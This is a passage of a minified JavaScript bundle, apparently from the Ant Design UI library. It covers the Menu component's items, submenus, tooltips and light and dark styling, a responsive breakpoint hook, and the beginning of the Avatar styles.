r,n,{className:a,children:s,icon:c,title:u,danger:p,extra:m}=e,{prefixCls:g,firstLevel:h,direction:S,disableMenuItemTitleTooltip:x,tooltip:C,inlineCollapsed:w,styles:k,classNames:$}=t.useContext(f),{siderCollapsed:E}=t.useContext(o.SiderContext),P=u;void 0===u?P=h?s:"":!1===u&&(P="");let T=!1===C?void 0:C,I=T&&void 0!==T.title?T.title:P,M={...T??null,title:I};E||w||(M.title=null,M.open=!1);let R=(0,y.toArray)(s).length,A=t.createElement(b.default,{...(0,i.omit)(e,["title","icon","danger"]),className:(0,l.clsx)(h?$?.item:$?.subMenu?.item,{[`${g}-item-danger`]:p,[`${g}-item-only-child`]:(c?R+1:R)===1},a),style:{...h?k?.item:k?.subMenu?.item,...e.style},title:"string"==typeof u?u:void 0},(0,d.cloneElement)(c,e=>({className:(0,l.clsx)(`${g}-item-icon`,h?$?.itemIcon:$?.subMenu?.itemIcon,e.className),style:{...h?k?.itemIcon:k?.subMenu?.itemIcon,...e.style}})),(r=s?.[0],n=t.createElement("span",{className:(0,l.clsx)(`${g}-title-content`,h?$?.itemContent:$?.subMenu?.itemContent,{[`${g}-title-content-with-extra`]:!!m||0===m}),style:h?k?.itemContent:k?.subMenu?.itemContent},s),(!c||t.isValidElement(s)&&"span"===s.type)&&s&&w&&h&&"string"==typeof r?t.createElement("div",{className:`${g}-inline-collapsed-noicon`},r.charAt(0)):n));if(!x&&!1!==C){let e=T&&T.placement?T.placement:"rtl"===S?"left":"right",r=`${g}-inline-collapsed-tooltip`,n=e=>({...e,root:(0,l.clsx)(r,e?.root)}),o=T&&"function"==typeof T.classNames?e=>n(T.classNames(e)):n(T?.classNames);A=t.createElement(v.default,{...M,placement:e,classNames:o},A)}return A};var x=e.i(32839),C=e.i(17206);let w=t.createContext(null),k=t.forwardRef((e,r)=>{let{children:n,...o}=e,a=t.useContext(w),i=t.useMemo(()=>({...a,...o}),[a,o.prefixCls,o.mode,o.selectable,o.rootClassName]),s=(0,x.supportNodeRef)(n),l=(0,x.useComposeRef)(r,s?(0,x.getNodeRef)(n):null);return t.createElement(w.Provider,{value:i},t.createElement(C.default,{space:!0},s?t.cloneElement(n,{ref:l}):n))});e.s(["OverrideProvider",0,k,"default",0,w],52199),e.i(96059);var $=e.i(15654);e.i(62370);var E=e.i(35551),P=e.i(83293),T=e.i(47580),I=e.i(64142),M=e.i(17356),R=e.i(46422),A=e.i(38378);let D=e=>(0,P.genFocusOutline)(e),L=(e,t)=>{let{componentCls:r,itemColor:n,itemSelectedColor:o,subMenuItemSelectedColor:a,groupTitleColor:i,itemBg:s,subMenuItemBg:l,itemSelectedBg:c,activeBarHeight:u,activeBarWidth:d,activeBarBorderWidth:p,motionDurationSlow:m,motionEaseInOut:f,motionEaseOut:g,itemPaddingInline:h,motionDurationMid:b,itemHoverColor:y,lineType:v,colorSplit:S,itemDisabledColor:x,dangerItemColor:C,dangerItemHoverColor:w,dangerItemSelectedColor:k,dangerItemActiveBg:E,dangerItemSelectedBg:P,popupBg:T,itemHoverBg:I,itemActiveBg:M,menuSubMenuBg:R,horizontalItemSelectedColor:A,horizontalItemSelectedBg:L,horizontalItemBorderRadius:_,horizontalItemHoverBg:O}=e;return{[`${r}-${t}, ${r}-${t} > ${r}`]:{color:n,background:s,[`&${r}-root:focus-visible`]:{...D(e)},[`${r}-item`]:{"&-group-title, &-extra":{color:i}},[`${r}-submenu-selected > ${r}-submenu-title`]:{color:a},[`${r}-item, ${r}-submenu-title`]:{color:n,[`&:not(${r}-item-disabled):focus-visible`]:{...D(e)}},[`${r}-item-disabled, ${r}-submenu-disabled`]:{color:`${x} !important`},[`${r}-item:not(${r}-item-selected):not(${r}-submenu-selected)`]:{[`&:hover, > ${r}-submenu-title:hover`]:{color:y}},[`&:not(${r}-horizontal)`]:{[`${r}-item:not(${r}-item-selected)`]:{"&:hover":{backgroundColor:I},"&:active":{backgroundColor:M}},[`${r}-submenu-title`]:{"&:hover":{backgroundColor:I},"&:active":{backgroundColor:M}}},[`${r}-item-danger`]:{color:C,[`&${r}-item:hover`]:{[`&:not(${r}-item-selected):not(${r}-submenu-selected)`]:{color:w}},[`&${r}-item:active`]:{background:E}},[`${r}-item a`]:{"&, &:hover":{color:"inherit"}},[`${r}-item-selected`]:{color:o,[`&${r}-item-danger`]:{color:k},"a, a:hover":{color:"inherit"}},[`& ${r}-item-selected`]:{backgroundColor:c,[`&${r}-item-danger`]:{backgroundColor:P}},[`&${r}-submenu > ${r}`]:{backgroundColor:R},[`&${r}-popup > ${r}`]:{backgroundColor:T},[`&${r}-submenu-popup > ${r}`]:{backgroundColor:T},[`&${r}-horizontal`]:{..."dark"===t?{borderBottom:0}:{},[`> ${r}-item, > ${r}-submenu`]:{top:p,marginTop:e.calc(p).mul(-1).equal(),marginBottom:0,borderRadius:_,"&::after":{position:"absolute",insetInline:h,bottom:0,borderBottom:`${(0,$.unit)(u)} solid transparent`,transition:`border-color ${m} ${f}`,content:'""'},"&:hover, &-active, &-open":{background:O,"&::after":{borderBottomWidth:u,borderBottomColor:A}},"&-selected":{color:A,backgroundColor:L,"&:hover":{backgroundColor:L},"&::after":{borderBottomWidth:u,borderBottomColor:A}}}},[`&${r}-root`]:{[`&${r}-inline, &${r}-vertical`]:{borderInlineEnd:`${(0,$.unit)(p)} ${v} ${S}`}},[`&${r}-inline`]:{[`${r}-sub${r}-inline`]:{background:l},[`${r}-item`]:{position:"relative","&::after":{position:"absolute",insetBlock:0,insetInlineEnd:0,borderInlineEnd:`${(0,$.unit)(d)} solid ${o}`,transform:"scaleY(0.0001)",opacity:0,transition:["transform","opacity"].map(e=>`${e} ${b} ${g}`).join(","),content:'""'},[`&${r}-item-danger`]:{"&::after":{borderInlineEndColor:k}}},[`${r}-selected, ${r}-item-selected`]:{"&::after":{transform:"scaleY(1)",opacity:1,transition:["transform","opacity"].map(e=>`${e} ${b} ${f}`).join(",")}}}}}},_=e=>{let{componentCls:t,itemHeight:r,itemMarginInline:n,padding:o,menuArrowSize:a,marginXS:i,itemMarginBlock:s,itemWidth:l,itemPaddingInline:c}=e,u=e.calc(a).add(o).add(i).equal();return{[`${t}-item`]:{position:"relative",overflow:"hidden"},[`${t}-item, ${t}-submenu-title`]:{height:r,lineHeight:(0,$.unit)(r),paddingInline:c,overflow:"hidden",textOverflow:"ellipsis",marginInline:n,marginBlock:s,width:l},[`> ${t}-item,
            > ${t}-submenu > ${t}-submenu-title`]:{height:r,lineHeight:(0,$.unit)(r)},[`${t}-item-group-list ${t}-submenu-title,
            ${t}-submenu-title`]:{paddingInlineEnd:u}}},O=e=>{let{componentCls:t,motionDurationSlow:r,motionDurationMid:n,motionEaseInOut:o,motionEaseOut:a,iconCls:i,iconSize:s,iconMarginInlineEnd:l}=e;return{[`${t}-item, ${t}-submenu-title`]:{position:"relative",display:"block",margin:0,whiteSpace:"nowrap",cursor:"pointer",transition:`border-color ${r},background-color ${r},padding calc(${r} + 0.1s) ${o}`,[`${t}-item-icon, ${i}`]:{minWidth:s,fontSize:s,transition:`font-size ${n} ${a},margin ${r} ${o},color ${r}`,"+ span":{marginInlineStart:l,opacity:1,transition:`opacity ${r} ${o},margin ${r},color ${r}`}},[`${t}-item-icon`]:{...(0,P.resetIcon)()},[`&${t}-item-only-child`]:{[`> ${i}, > ${t}-item-icon`]:{marginInlineEnd:0}}},[`${t}-item-disabled, ${t}-submenu-disabled`]:{background:"none !important",cursor:"not-allowed","&::after":{borderColor:"transparent !important"},a:{color:"inherit !important",cursor:"not-allowed",pointerEvents:"none"},[`> ${t}-submenu-title`]:{color:"inherit !important",cursor:"not-allowed"}}}},N=e=>{let{componentCls:t,motionDurationSlow:r,motionEaseInOut:n,borderRadius:o,menuArrowSize:a,menuArrowOffset:i}=e;return{[`${t}-submenu`]:{"&-expand-icon, &-arrow":{position:"absolute",top:"50%",insetInlineEnd:e.margin,width:a,color:"currentcolor",transform:"translateY(-50%)",transition:["transform","opacity"].map(e=>`${e} ${r}`).join(",")},"&-arrow":{"&::before, &::after":{position:"absolute",width:e.calc(a).mul(.6).equal(),height:e.calc(a).mul(.15).equal(),backgroundColor:"currentcolor",borderRadius:o,transition:["background-color","transform","top","color"].map(e=>`${e} ${r} ${n}`).join(","),content:'""'},"&::before":{transform:`rotate(45deg) translateY(${(0,$.unit)(e.calc(i).mul(-1).equal())})`},"&::after":{transform:`rotate(-45deg) translateY(${(0,$.unit)(i)})`}}}}},F=e=>{let{colorPrimary:t,colorError:r,colorTextDisabled:n,colorErrorBg:o,colorText:a,colorTextDescription:i,colorBgContainer:s,colorFillAlter:l,colorFillContent:c,lineWidth:u,lineWidthBold:d,controlItemBgActive:p,colorBgTextHover:m,controlHeightLG:f,lineHeight:g,colorBgElevated:h,marginXXS:b,padding:y,fontSize:v,controlHeightSM:S,fontSizeLG:x,colorTextLightSolid:C,colorErrorHover:w}=e,k=e.activeBarWidth??0,$=e.activeBarBorderWidth??u,P=e.itemMarginInline??e.marginXXS,T=new E.FastColor(C).setA(.65).toRgbString();return{dropdownWidth:160,zIndexPopup:e.zIndexPopupBase+50,radiusItem:e.borderRadiusLG,itemBorderRadius:e.borderRadiusLG,radiusSubMenuItem:e.borderRadiusSM,subMenuItemBorderRadius:e.borderRadiusSM,colorItemText:a,itemColor:a,colorItemTextHover:a,itemHoverColor:a,colorItemTextHoverHorizontal:t,horizontalItemHoverColor:t,colorGroupTitle:i,groupTitleColor:i,colorItemTextSelected:t,itemSelectedColor:t,subMenuItemSelectedColor:t,colorItemTextSelectedHorizontal:t,horizontalItemSelectedColor:t,colorItemBg:s,itemBg:s,colorItemBgHover:m,itemHoverBg:m,colorItemBgActive:c,itemActiveBg:p,colorSubItemBg:l,subMenuItemBg:l,colorItemBgSelected:p,itemSelectedBg:p,colorItemBgSelectedHorizontal:"transparent",horizontalItemSelectedBg:"transparent",colorActiveBarWidth:0,activeBarWidth:k,colorActiveBarHeight:d,activeBarHeight:d,colorActiveBarBorderSize:u,activeBarBorderWidth:$,colorItemTextDisabled:n,itemDisabledColor:n,colorDangerItemText:r,dangerItemColor:r,colorDangerItemTextHover:r,dangerItemHoverColor:r,colorDangerItemTextSelected:r,dangerItemSelectedColor:r,colorDangerItemBgActive:o,dangerItemActiveBg:o,colorDangerItemBgSelected:o,dangerItemSelectedBg:o,itemMarginInline:P,horizontalItemBorderRadius:0,horizontalItemHoverBg:"transparent",itemHeight:f,groupTitleLineHeight:g,collapsedWidth:2*f,popupBg:h,itemMarginBlock:b,itemPaddingInline:y,horizontalLineHeight:`${1.15*f}px`,iconSize:v,iconMarginInlineEnd:S-v,collapsedIconSize:x,groupTitleFontSize:v,darkItemDisabledColor:new E.FastColor(C).setA(.25).toRgbString(),darkItemColor:T,darkDangerItemColor:r,darkItemBg:"#001529",darkPopupBg:"#001529",darkSubMenuItemBg:"#000c17",darkItemSelectedColor:C,darkItemSelectedBg:t,darkDangerItemSelectedBg:r,darkItemHoverBg:"transparent",darkGroupTitleColor:T,darkItemHoverColor:C,darkDangerItemHoverColor:w,darkDangerItemSelectedColor:C,darkDangerItemActiveBg:r,itemWidth:k?`calc(100% + ${$}px)`:`calc(100% - ${2*P}px)`}};var j=e.i(4079),j=j,H=e.i(60698),B=e.i(22767);let z=e=>{let r,{popupClassName:n,icon:o,title:a,theme:s}=e,c=t.useContext(f),{prefixCls:u,inlineCollapsed:p,theme:m,classNames:g,styles:h}=c,b=(0,H.useFullPath)();if(o){let e=t.isValidElement(a)&&"span"===a.type;r=t.createElement(t.Fragment,null,(0,d.cloneElement)(o,e=>({className:(0,l.clsx)(e.className,`${u}-item-icon`,g?.itemIcon),style:{...e.style,...h?.itemIcon}})),e?a:t.createElement("span",{className:`${u}-title-content`},a))}else r=p&&!b.length&&a&&"string"==typeof a?t.createElement("div",{className:`${u}-inline-collapsed-noicon`},a.charAt(0)):t.createElement("span",{className:`${u}-title-content`},a);let y=t.useMemo(()=>({...c,firstLevel:!1}),[c]),[v]=(0,B.useZIndex)("Menu");return t.createElement(f.Provider,{value:y},t.createElement(j.default,{...(0,i.omit)(e,["icon"]),title:r,classNames:{list:g?.subMenu?.list,listTitle:g?.subMenu?.itemTitle},styles:{list:h?.subMenu?.list,listTitle:h?.subMenu?.itemTitle},popupClassName:(0,l.clsx)(u,n,g?.popup?.root,`${u}-${s||m}`),popupStyle:{zIndex:v,...e.popupStyle,...h?.popup?.root}}))};function V(e){return null===e||!1===e}let W={item:S,submenu:z,divider:h},U=(0,t.forwardRef)((e,n)=>{let o=t.useContext(w),g=o||{},{prefixCls:h,className:b,style:y,theme:v="light",expandIcon:S,_internalDisableMenuItemTitleTooltip:x,tooltip:C,inlineCollapsed:k,siderCollapsed:E,rootClassName:D,mode:j,selectable:H,onClick:B,overflowedIndicatorPopupClassName:z,classNames:U,styles:q,...G}=e,{menu:J}=t.useContext(p.ConfigContext),{getPrefixCls:X,getPopupContainer:K,direction:Q,className:Y,style:Z,classNames:ee,styles:et}=(0,p.useComponentConfig)("menu"),er=X(),en=(0,i.omit)(G,["collapsedWidth"]);g.validator?.({mode:j});let eo=(0,s.useEvent)((...e)=>{B?.(...e),g.onClick?.()}),ea=g.mode||j,ei=H??g.selectable,es=k??E,el={...e,mode:ea,inlineCollapsed:es,selectable:ei,theme:v},[ec,eu]=(0,c.useMergeSemantic)([ee,U],[et,q],{props:el},{popup:{_default:"root"},subMenu:{_default:"item"}}),ed={horizontal:{motionName:`${er}-slide-up`},inline:(0,u.default)(er),other:{motionName:`${er}-zoom-big`}},ep=X("menu",h||g.prefixCls),em=(0,m.default)(ep),[ef,eg]=((e,t=e,r=!0)=>(0,R.genStyleHooks)("Menu",e=>{let{colorBgElevated:t,controlHeightLG:r,fontSize:n,darkItemColor:o,darkDangerItemColor:a,darkItemBg:i,darkSubMenuItemBg:s,darkItemSelectedColor:l,darkItemSelectedBg:c,darkDangerItemSelectedBg:u,darkItemHoverBg:d,darkGroupTitleColor:p,darkItemHoverColor:m,darkItemDisabledColor:f,darkDangerItemHoverColor:g,darkDangerItemSelectedColor:h,darkDangerItemActiveBg:b,popupBg:y,darkPopupBg:v}=e,S=e.calc(n).div(7).mul(5).equal(),x=(0,A.mergeToken)(e,{menuArrowSize:S,menuHorizontalHeight:e.calc(r).mul(1.15).equal(),menuArrowOffset:e.calc(S).mul(.25).equal(),menuSubMenuBg:t,calc:e.calc,popupBg:y}),C=(0,A.mergeToken)(x,{itemColor:o,itemHoverColor:m,groupTitleColor:p,itemSelectedColor:l,subMenuItemSelectedColor:l,itemBg:i,popupBg:v,subMenuItemBg:s,itemActiveBg:"transparent",itemSelectedBg:c,activeBarHeight:0,activeBarBorderWidth:0,itemHoverBg:d,itemDisabledColor:f,dangerItemColor:a,dangerItemHoverColor:g,dangerItemSelectedColor:h,dangerItemActiveBg:b,dangerItemSelectedBg:u,menuSubMenuBg:s,horizontalItemSelectedColor:l,horizontalItemSelectedBg:c});return[(e=>{let{antCls:t,componentCls:r,fontSize:n,motionDurationSlow:o,motionDurationMid:a,motionEaseInOut:i,paddingXS:s,padding:l,colorSplit:c,lineWidth:u,zIndexPopup:d,borderRadiusLG:p,subMenuItemBorderRadius:m,menuArrowSize:f,menuArrowOffset:g,lineType:h,groupTitleLineHeight:b,groupTitleFontSize:y}=e;return[{"":{[r]:{...(0,P.clearFix)(),"&-hidden":{display:"none"}}},[`${r}-submenu-hidden`]:{display:"none"}},{[r]:{...(0,P.resetComponent)(e),...(0,P.clearFix)(),marginBottom:0,paddingInlineStart:0,fontSize:n,lineHeight:0,listStyle:"none",outline:"none",transition:`width ${o} cubic-bezier(0.2, 0, 0, 1) 0s`,"ul, ol":{margin:0,padding:0,listStyle:"none"},"&-overflow":{display:"flex",[`${r}-item`]:{flex:"none"}},[`${r}-item, ${r}-submenu, ${r}-submenu-title`]:{borderRadius:e.itemBorderRadius},[`${r}-item-group-title`]:{padding:`${(0,$.unit)(s)} ${(0,$.unit)(l)}`,fontSize:y,lineHeight:b,transition:`all ${o}`},[`&-horizontal ${r}-submenu`]:{transition:["border-color","background-color"].map(e=>`${e} ${o} ${i}`).join(",")},[`${r}-submenu, ${r}-submenu-inline`]:{transition:[`border-color ${o}`,`background-color ${o}`,`padding ${a}`].map(e=>`${e} ${i}`).join(",")},[`${r}-submenu ${r}-sub`]:{cursor:"initial",transition:["background-color","padding"].map(e=>`${e} ${o} ${i}`).join(",")},[`${r}-title-content`]:{transition:`color ${o}`,"&-with-extra":{display:"inline-flex",alignItems:"center",width:"100%"},[`> ${t}-typography-ellipsis-single-line`]:{display:"inline",verticalAlign:"unset"},[`${r}-item-extra`]:{marginInlineStart:"auto",paddingInlineStart:e.padding}},[`${r}-item a`]:{"&::before":{position:"absolute",inset:0,backgroundColor:"transparent",content:'""'}},[`${r}-item-divider`]:{overflow:"hidden",lineHeight:0,borderColor:c,borderStyle:h,borderWidth:0,borderTopWidth:u,marginBlock:u,padding:0,"&-dashed":{borderStyle:"dashed"}},...O(e),[`${r}-item-group`]:{[`${r}-item-group-list`]:{margin:0,padding:0,[`${r}-item, ${r}-submenu-title`]:{paddingInline:`${(0,$.unit)(e.calc(n).mul(2).equal())} ${(0,$.unit)(l)}`}}},"&-submenu":{"&-popup":{position:"absolute",zIndex:d,borderRadius:p,boxShadow:"none",transformOrigin:"0 0",[`&${r}-submenu`]:{background:"transparent"},"&::before":{position:"absolute",inset:0,zIndex:-1,width:"100%",height:"100%",opacity:0,content:'""'},[`> ${r}`]:{borderRadius:p,...O(e),...N(e),[`${r}-item, ${r}-submenu > ${r}-submenu-title`]:{borderRadius:m},[`${r}-submenu-title::after`]:{transition:`transform ${o} ${i}`}}},[`
          &-placement-leftTop,
          &-placement-bottomRight,
          `]:{transformOrigin:"100% 0"},[`
          &-placement-leftBottom,
          &-placement-topRight,
          `]:{transformOrigin:"100% 100%"},[`
          &-placement-rightBottom,
          &-placement-topLeft,
          `]:{transformOrigin:"0 100%"},[`
          &-placement-bottomLeft,
          &-placement-rightTop,
          `]:{transformOrigin:"0 0"},[`
          &-placement-leftTop,
          &-placement-leftBottom
          `]:{paddingInlineEnd:e.paddingXS},[`
          &-placement-rightTop,
          &-placement-rightBottom
          `]:{paddingInlineStart:e.paddingXS},[`
          &-placement-topRight,
          &-placement-topLeft
          `]:{paddingBottom:e.paddingXS},[`
          &-placement-bottomRight,
          &-placement-bottomLeft
          `]:{paddingTop:e.paddingXS}},...N(e),[`&-inline-collapsed ${r}-submenu-arrow,
        &-inline ${r}-submenu-arrow`]:{"&::before":{transform:`rotate(-45deg) translateX(${(0,$.unit)(g)})`},"&::after":{transform:`rotate(45deg) translateX(${(0,$.unit)(e.calc(g).mul(-1).equal())})`}},[`${r}-submenu-open${r}-submenu-inline > ${r}-submenu-title > ${r}-submenu-arrow`]:{transform:`translateY(${(0,$.unit)(e.calc(f).mul(.2).mul(-1).equal())})`,"&::after":{transform:`rotate(-45deg) translateX(${(0,$.unit)(e.calc(g).mul(-1).equal())})`},"&::before":{transform:`rotate(45deg) translateX(${(0,$.unit)(g)})`}}}},{[`${t}-layout-header`]:{[r]:{lineHeight:"inherit"}}}]})(x),(e=>{let{componentCls:t,motionDurationSlow:r,horizontalLineHeight:n,colorSplit:o,lineWidth:a,lineType:i,itemPaddingInline:s}=e;return{[`${t}-horizontal`]:{lineHeight:n,border:0,borderBottom:`${(0,$.unit)(a)} ${i} ${o}`,boxShadow:"none","&::after":{display:"block",clear:"both",height:0,content:'"\\20"'},[`${t}-item, ${t}-submenu`]:{position:"relative",display:"inline-block",verticalAlign:"bottom",paddingInline:s},[`> ${t}-item:hover,
        > ${t}-item-active,
        > ${t}-submenu ${t}-submenu-title:hover`]:{backgroundColor:"transparent"},[`${t}-item, ${t}-submenu-title`]:{transition:["border-color","background-color"].map(e=>`${e} ${r}`).join(",")},[`${t}-submenu-arrow`]:{display:"none"}}}})(x),(e=>{let{componentCls:t,iconCls:r,itemHeight:n,colorTextLightSolid:o,dropdownWidth:a,controlHeightLG:i,motionEaseOut:s,paddingXL:l,itemMarginInline:c,fontSizeLG:u,motionDurationFast:d,motionDurationSlow:p,paddingXS:m,boxShadowSecondary:f,collapsedWidth:g,collapsedIconSize:h}=e,b={height:n,lineHeight:(0,$.unit)(n),listStylePosition:"inside",listStyleType:"disc"};return[{[t]:{"&-inline, &-vertical":{[`&${t}-root`]:{boxShadow:"none"},..._(e)}},[`${t}-submenu-popup`]:{[`${t}-vertical`]:{..._(e),boxShadow:f}}},{[`${t}-submenu-popup ${t}-vertical${t}-sub`]:{minWidth:a,maxHeight:`calc(100vh - ${(0,$.unit)(e.calc(i).mul(2.5).equal())})`,padding:"0",overflow:"hidden",borderInlineEnd:0,"&:not([class*='-active'])":{overflowX:"hidden",overflowY:"auto"}}},{[`${t}-inline`]:{width:"100%",[`&${t}-root`]:{[`${t}-item, ${t}-submenu-title`]:{display:"flex",alignItems:"center",transition:`border-color ${p},background-color ${p},padding ${d} ${s}`,[`> ${t}-title-content`]:{flex:"auto",minWidth:0,overflow:"hidden",textOverflow:"ellipsis"},"> *":{flex:"none"}}},[`${t}-sub${t}-inline`]:{padding:0,border:0,borderRadius:0,boxShadow:"none",[`& > ${t}-submenu > ${t}-submenu-title`]:b,[`& ${t}-item-group-title`]:{paddingInlineStart:l}},[`${t}-item`]:b}},{[`${t}-inline-collapsed`]:{width:g,[`&${t}-root`]:{[`${t}-item, ${t}-submenu ${t}-submenu-title`]:{[`> ${t}-inline-collapsed-noicon`]:{fontSize:u,textAlign:"center"}}},[`> ${t}-item,
          > ${t}-item-group > ${t}-item-group-list > ${t}-item,
          > ${t}-item-group > ${t}-item-group-list > ${t}-submenu > ${t}-submenu-title,
          > ${t}-submenu > ${t}-submenu-title`]:{insetInlineStart:0,paddingInline:`calc(50% - ${(0,$.unit)(e.calc(h).div(2).equal())} - ${(0,$.unit)(c)})`,textOverflow:"clip",[`
            ${t}-submenu-arrow,
            ${t}-submenu-expand-icon
          `]:{opacity:0},[`${t}-item-icon, ${r}`]:{margin:0,fontSize:h,lineHeight:(0,$.unit)(n),"+ span":{display:"inline-block",opacity:0}}},[`${t}-item-icon, ${r}`]:{display:"inline-block"},"&-tooltip":{pointerEvents:"none",[`${t}-item-icon, ${r}`]:{display:"none"},"a, a:hover":{color:o}},[`${t}-item-group-title`]:{...P.textEllipsis,paddingInline:m}}}]})(x),L(x,"light"),L(C,"dark"),(({componentCls:e,menuArrowOffset:t,calc:r})=>({[`${e}-rtl`]:{direction:"rtl"},[`${e}-submenu-rtl`]:{transformOrigin:"100% 0"},[`${e}-rtl${e}-vertical,
    ${e}-submenu-rtl ${e}-vertical`]:{[`${e}-submenu-arrow`]:{"&::before":{transform:`rotate(-45deg) translateY(${(0,$.unit)(r(t).mul(-1).equal())})`},"&::after":{transform:`rotate(45deg) translateY(${(0,$.unit)(t)})`}}}}))(x),(0,T.genCollapseMotion)(x),(0,I.initSlideMotion)(x,"slide-up"),(0,I.initSlideMotion)(x,"slide-down"),(0,M.initZoomMotion)(x,"zoom-big")]},F,{deprecatedTokens:[["colorGroupTitle","groupTitleColor"],["radiusItem","itemBorderRadius"],["radiusSubMenuItem","subMenuItemBorderRadius"],["colorItemText","itemColor"],["colorItemTextHover","itemHoverColor"],["colorItemTextHoverHorizontal","horizontalItemHoverColor"],["colorItemTextSelected","itemSelectedColor"],["colorItemTextSelectedHorizontal","horizontalItemSelectedColor"],["colorItemTextDisabled","itemDisabledColor"],["colorDangerItemText","dangerItemColor"],["colorDangerItemTextHover","dangerItemHoverColor"],["colorDangerItemTextSelected","dangerItemSelectedColor"],["colorDangerItemBgActive","dangerItemActiveBg"],["colorDangerItemBgSelected","dangerItemSelectedBg"],["colorItemBg","itemBg"],["colorItemBgHover","itemHoverBg"],["colorSubItemBg","subMenuItemBg"],["colorItemBgActive","itemActiveBg"],["colorItemBgSelectedHorizontal","horizontalItemSelectedBg"],["colorActiveBarWidth","activeBarWidth"],["colorActiveBarHeight","activeBarHeight"],["colorActiveBarBorderSize","activeBarBorderWidth"],["colorItemBgSelected","itemSelectedBg"]],injectStyle:r,unitless:{groupTitleLineHeight:!0}})(e,t))(ep,em,!o),eh=(0,l.clsx)(`${ep}-${v}`,Y,b),eb=t.useMemo(()=>{if("function"==typeof S||V(S))return S||null;if("function"==typeof g.expandIcon||V(g.expandIcon))return g.expandIcon||null;if("function"==typeof J?.expandIcon||V(J?.expandIcon))return J?.expandIcon||null;let e=S??g?.expandIcon??J?.expandIcon;return(0,d.cloneElement)(e,{className:(0,l.clsx)(`${ep}-submenu-expand-icon`,t.isValidElement(e)?e.props?.className:void 0)})},[S,g?.expandIcon,J?.expandIcon,ep]),ey=t.useMemo(()=>({prefixCls:ep,inlineCollapsed:es||!1,direction:Q,firstLevel:!0,theme:v,mode:ea,disableMenuItemTitleTooltip:x,tooltip:C,classNames:ec,styles:eu}),[ep,es,Q,x,v,ea,ec,eu,C]);return t.createElement(w.Provider,{value:null},t.createElement(f.Provider,{value:ey},t.createElement(r.default,{getPopupContainer:K,overflowedIndicator:t.createElement(a.default,null),overflowedIndicatorPopupClassName:(0,l.clsx)(ep,`${ep}-${v}`,z),classNames:{list:ec.list,listTitle:ec.itemTitle},styles:{list:eu.list,listTitle:eu.itemTitle},mode:ea,selectable:ei,onClick:eo,...en,inlineCollapsed:es,style:{...eu.root,...Z,...y},className:eh,prefixCls:ep,direction:Q,defaultMotions:ed,expandIcon:eb,ref:n,rootClassName:(0,l.clsx)(D,ef,g.rootClassName,eg,em,ec.root),_internalComponents:W})))}),q=(0,t.forwardRef)((e,r)=>{let n=(0,t.useRef)(null),a=t.useContext(o.SiderContext);return(0,t.useImperativeHandle)(r,()=>({menu:n.current,focus:e=>{n.current?.focus(e)}})),t.createElement(U,{ref:n,...e,...a})});q.Item=S,q.SubMenu=z,q.Divider=h,q.ItemGroup=n.default,e.s(["default",0,q],60699)},22140,52947,5330,22530,e=>{"use strict";var t=e.i(43476),r=e.i(71645),n=e.i(22016),o=e.i(92989),a=e.i(60699),a=a,i=e.i(72943),s=e.i(98586);e.i(47167);var l=e.i(78052),c=e.i(32839),u=e.i(7670),d=e.i(4458);let p=["xxxl","xxl","xl","lg","md","sm","xs"];[].concat(p).reverse();var m=e.i(42064),f=e.i(21883),g=e.i(17455),h=e.i(1676);let b=function(e=!0,t={}){let n=(0,r.useRef)(t),[,o]=r.default.useReducer(e=>e+1,0),a=(()=>{let e,[,t]=(0,d.useToken)(),n=((e=[].concat(p).reverse()).forEach((r,n)=>{let o=r.toUpperCase(),a=`screen${o}Min`,i=`screen${o}`;if(!(t[a]<=t[i]))throw Error(`${a}<=${i} fails : !(${t[a]}<=${t[i]})`);if(n<e.length-1){let r=`screen${o}Max`;if(!(t[i]<=t[r]))throw Error(`${i}<=${r} fails : !(${t[i]}<=${t[r]})`);let a=e[n+1].toUpperCase(),s=`screen${a}Min`;if(!(t[r]<=t[s]))throw Error(`${r}<=${s} fails : !(${t[r]}<=${t[s]})`)}}),{xs:`(max-width: ${t.screenXSMax}px)`,sm:`(min-width: ${t.screenSM}px)`,md:`(min-width: ${t.screenMD}px)`,lg:`(min-width: ${t.screenLG}px)`,xl:`(min-width: ${t.screenXL}px)`,xxl:`(min-width: ${t.screenXXL}px)`,xxxl:`(min-width: ${t.screenXXXL}px)`});return r.default.useMemo(()=>{let e=new Map,t=-1,r={};return{responsiveMap:n,matchHandlers:{},dispatch:t=>(r=t,e.forEach(e=>e(r)),e.size>=1),subscribe(n){return e.size||this.register(),t+=1,e.set(t,n),n(r),t},unsubscribe(t){e.delete(t),e.size||this.unregister()},register(){Object.entries(n).forEach(([e,t])=>{let n=({matches:t})=>{this.dispatch({...r,[e]:t})},o=window.matchMedia(t);"function"==typeof o?.addEventListener&&o.addEventListener("change",n),this.matchHandlers[t]={mql:o,listener:n},n(o)})},unregister(){Object.values(n).forEach(e=>{let t=this.matchHandlers[e];"function"==typeof t?.mql?.removeEventListener&&t.mql.removeEventListener("change",t?.listener)}),e.clear()}}},[n])})();return(0,h.default)(()=>{let t=a.subscribe(t=>{n.current=t,e&&o()});return()=>a.unsubscribe(t)},[]),n.current},y=r.createContext({});e.i(96059);var v=e.i(15654),S=e.i(83293),x=e.i(46422),C=e.i(38378);let w=(0,x.genStyleHooks)("Avatar",e=>{let{colorTextLightSolid:t,colorTextPlaceholder:r}=e,n=(0,C.mergeToken)(e,{avatarBg:r,avatarColor:t});return[(e=>{let{antCls:t,componentCls:r,iconCls:n,avatarBg:o,avatarColor:a,containerSize:i,containerSizeLG:s,containerSizeSM:l,textFontSize:c,textFontSizeLG:u,textFontSizeSM:d,iconFontSize:p,iconFontSizeLG:m,iconFontSizeSM:f,borderRadius:g,borderRadiusLG:h,borderRadiusSM:b,lineWidth:y,lineType:x}=e,C=(e,t,o,a)=>({width:e,height:e,borderRadius:"50%",fontSize:t,[`&${r}-square`]:{borderRadius:a},[`&${r}-icon`]:{fontSize:o,[`> ${n}`]:{margin:0}}});return{[r]:{...(0,S.resetComponent)(e),position:"relative",display:"inline-flex",justifyContent:"center",alignItems:"center",overflow:"hidden",color:a,whiteSpace:"nowrap",textAlign:"center",verticalAlign:"middle",background:o,border:`${(0,v.unit)(y)} ${x} transparent`,"&-image":{background:"transparent"},[`${t}-image-img`]:{display:"block"},...C(i,c,p,g),"&-lg":{...C(s,u,m,h)},"&-sm":{...C(l,d,f,b)},"> img":{display:"block",width:"100%",height:"100%",objectFit:"cover"}}}})(n),(e=>{let{componentCls:t,groupBorderColor:r,groupOverlapping:n,groupSpace:o}=e;return{[`${t}-group`]:{display:"inline-flex",[t]:{borderColor:r},"> *:not(:first-child)":{marginInlineStart:n}},[`${t}-group-popover`]:{[`${t} + 